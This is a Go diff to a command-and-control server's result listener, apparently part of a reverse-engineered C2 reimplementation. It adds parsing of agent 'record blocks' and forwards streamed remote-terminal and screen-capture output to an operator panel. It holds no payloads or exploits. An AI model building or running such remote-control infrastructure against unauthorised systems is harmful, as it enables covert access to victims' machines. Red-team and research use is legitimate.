@@ -7,6 +7,7 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"crypto/x509/pkix"
+	"encoding/binary"
 	"encoding/json"
 	"encoding/pem"
 	"fmt"
@@ -445,24 +446,66 @@ func (cl *C2Listener) handlePostResult(w http.ResponseWriter, r *http.Request) {
 	defer r.Body.Close()
 
 	var req ResultRequest
+	var rawBody []byte
 	if err := json.Unmarshal(body, &req); err != nil {
 		// Agent transport frame fallback, same as check-in: the HTTP transport
 		// GCM-wraps the result body.
 		engine := GetEngine()
 		listener := engine.GetListener(cl.ID)
-		if listener != nil && listener.EncryptSalt != "" {
-			pt, ferr := FrameDecrypt(body, listener.EncryptSalt)
-			if ferr != nil || json.Unmarshal(pt, &req) != nil {
-				http.Error(w, "Bad request", http.StatusBadRequest)
-				return
-			}
-		} else {
+		if listener == nil || listener.EncryptSalt == "" {
 			http.Error(w, "Bad request", http.StatusBadRequest)
 			return
 		}
+		pt, ferr := FrameDecrypt(body, listener.EncryptSalt)
+		if ferr != nil {
+			http.Error(w, "Bad request", http.StatusBadRequest)
+			return
+		}
+		rawBody = pt
+		// 帧内载荷有两种形态：
+		//   1. 早期复刻端的 ResultRequest JSON —— 当前唯一有生产者的形态
+		//      （agent/transport_real.go 的 SendResult）
+		//   2. 结果记录块 —— 严格增量的容错路径，当前无生产者，形态为
+		//      复刻端定义的契约而非原版事实（见下方记录块一节）
+		// 只有两者都不是才拒绝；此处不早退，交由下面的分支判定。
+		if json.Unmarshal(pt, &req) != nil {
+			req = ResultRequest{}
+		}
 	}
 
+	// 记录块判定：JSON 里没有 CommandID/Result，且帧内载荷通过记录块的形状校验
+	// （见 DecodeAgentResultBlock：0x54 终止记录 + 长度自洽）。原版记录块不带
+	// VerifyKey（凭据来自连接本身），因此不能拿 ResultRequest 的凭据规则去套它。
+	recordBlock := req.CommandID == 0 && req.Result == "" && IsAgentResultBlock(rawBody)
+
 	engine := GetEngine()
+
+	if recordBlock {
+		// 记录块路径：原版不在记录里回传 client id / task id / verify key
+		// （命令记录由服务器侧的任务索引关联，见 FUN_0100dec0 /
+		// FUN_0100dda0 把记录序号写回索引表），因此按「该监听器唯一活跃
+		// 客户端」归属；无法唯一确定时记录日志并丢弃，不猜。
+		clientID, ok := cl.singleResultClient()
+		if !ok {
+			Logf("Listener %d: record-block result from %s cannot be attributed to a unique client; dropped",
+				cl.ID, r.RemoteAddr)
+			w.Header().Set("Content-Type", "application/json")
+			json.NewEncoder(w).Encode(ResultResponse{Status: "ok", Received: false})
+			return
+		}
+		text := DecodeAgentRecordText(rawBody)
+		Logf("Listener %d: record-block result from client %d (%d records, %d text bytes)",
+			cl.ID, clientID, len(ParseAgentRecordBlock(rawBody)), len(text))
+		// 流式结果（terminal_output: / screen_frame:）按原样转发给面板查看者；
+		// 其余文本无法定位到具体任务（记录里没有任务序号，见上面的说明），
+		// 只记日志，不臆造任务归属。
+		if text != "" && forwardStreamingResult(clientID, text) {
+			Logf("Listener %d: streamed record result from client %d", cl.ID, clientID)
+		}
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(ResultResponse{Status: "ok", Received: true})
+		return
+	}
 
 	// The verify key is the only credential on the result channel: without it,
 	// any remote caller could forge results (including fake terminal/screen
@@ -493,6 +536,107 @@ func (cl *C2Listener) handlePostResult(w http.ResponseWriter, r *http.Request) {
 		Status:   "ok",
 		Received: true,
 	})
+}
+
+// ============================================================================
+// Agent result record block (原版结果帧) — TOLERANCE PATH, currently no producer
+// 结果记录块解析（容错路径，当前无生产者）
+//
+// 原版 agent 把任务结果写成 24 字节类型化记录序列（FUN_0100d160 的布局，
+// 见 c2engine/wire.go 的 AgentField）。结果文本由 FUN_01094ba0 编成一条
+// 0x75 记录（A=0, B=1, C=0）加一条 0x54 终止记录（A=1, B=1, C=0）；记录
+// 本身不带 client id / task id —— 原版用记录序号在服务器侧的任务索引里查
+// （FUN_0100dec0 / FUN_0100dda0 → cmd+0x50[index]）。
+//
+// 重要：**记录→线缆的形态未恢复**。没有任何函数把缓冲 +0x88/+0x90 取出来
+// 写 socket（已排除项与已确证事实见 agent/main.go 的「Result frames on the
+// wire」一节）。因此下面这套解析的输入形态（记录块之后内联负载、+0x10 写
+// 负载长度）是**复刻端定义的契约，不是原版事实**；它当前也**没有生产者**
+// —— agent 各传输仍发 ResultRequest JSON（agent/transport_real.go 的
+// SendResult 记录了该偏差）。
+//
+// 保留它的唯一目的是「严格增量的容错」：服务器先按 JSON 解析，只有当载荷
+// 通过下面的形状校验时才走记录块分支，因此即便将来出现说记录块的 agent，
+// 这条路径能接住；在那之前它不会被触发。不要据此认为记录块已经在用。
+// ============================================================================
+
+// DecodeAgentResultBlock 解析结果记录块（复刻端契约形态，见上）。
+// DecodeAgentResultBlock parses a result record block in the reimplementation's
+// contract shape (see above — not a recovered original wire format).
+//
+// 形状：
+//
+//	[24B 负载记录][24B 0x54 终止记录(A=1,B=1,C=0)][负载字节]
+//
+// 校验点：终止记录的固定字段、块长恰为 48 + (+0x10 的长度)。两条同时成立
+// 才认，避免把任意帧误判成记录块。
+func DecodeAgentResultBlock(data []byte) (recs []AgentField, load []byte, ok bool) {
+	if len(data) < 48 {
+		return nil, nil, false
+	}
+	end := data[24:48]
+	if end[0] != 0x54 ||
+		binary.LittleEndian.Uint32(end[4:]) != 1 ||
+		binary.LittleEndian.Uint32(end[8:]) != 1 ||
+		binary.LittleEndian.Uint32(end[12:]) != 0 ||
+		binary.LittleEndian.Uint64(end[16:]) != 0 {
+		return nil, nil, false
+	}
+	n := int(binary.LittleEndian.Uint64(data[16:]))
+	if n < 0 || 48+n != len(data) {
+		return nil, nil, false
+	}
+	return ParseAgentRecordBlock(data[:48]), data[48:], true
+}
+
+// ParseAgentRecordBlock 解析 24 字节记录块。
+// ParseAgentRecordBlock parses a block of 24-byte agent records.
+func ParseAgentRecordBlock(data []byte) []AgentField {
+	return ParseAgentFrame(data)
+}
+
+// DecodeAgentRecordText 把结果记录块还原成结果文本。
+// DecodeAgentRecordText renders a result record block back into text.
+//
+// 0x75 是字符串结果记录（FUN_01094ba0），契约形态里负载即文本；其余记录
+// 类型（如 FUN_01094a20 的 0x48 标量）不在这里翻译 —— 它们的服务器侧渲染
+// 方式没有证据，不臆造。
+func DecodeAgentRecordText(data []byte) string {
+	recs, load, ok := DecodeAgentResultBlock(data)
+	if !ok || len(recs) == 0 || recs[0].Kind != 0x75 {
+		return ""
+	}
+	return string(load)
+}
+
+// IsAgentResultBlock 判断帧内载荷是否为一个合法的 agent 结果记录块。
+// IsAgentResultBlock reports whether a frame payload is a valid result block.
+func IsAgentResultBlock(data []byte) bool {
+	_, _, ok := DecodeAgentResultBlock(data)
+	return ok
+}
+
+// singleResultClient 找出该监听器下唯一活跃的客户端。
+// singleResultClient returns the listener's only active client.
+//
+// 记录块不带 client id；只有当该监听器下恰有一个客户端时才能唯一归属，
+// 否则返回 false（调用方丢弃并记日志，不猜）。会话表由签到写入，记录结果
+// 必然发生在签到之后。
+func (cl *C2Listener) singleResultClient() (int64, bool) {
+	cl.mu.RLock()
+	ids := make(map[int64]struct{}, len(cl.sessions))
+	for _, s := range cl.sessions {
+		if s != nil {
+			ids[s.ClientID] = struct{}{}
+		}
+	}
+	cl.mu.RUnlock()
+	if len(ids) == 1 {
+		for id := range ids {
+			return id, true
+		}
+	}
+	return 0, false
 }
 
 // ============================================================================
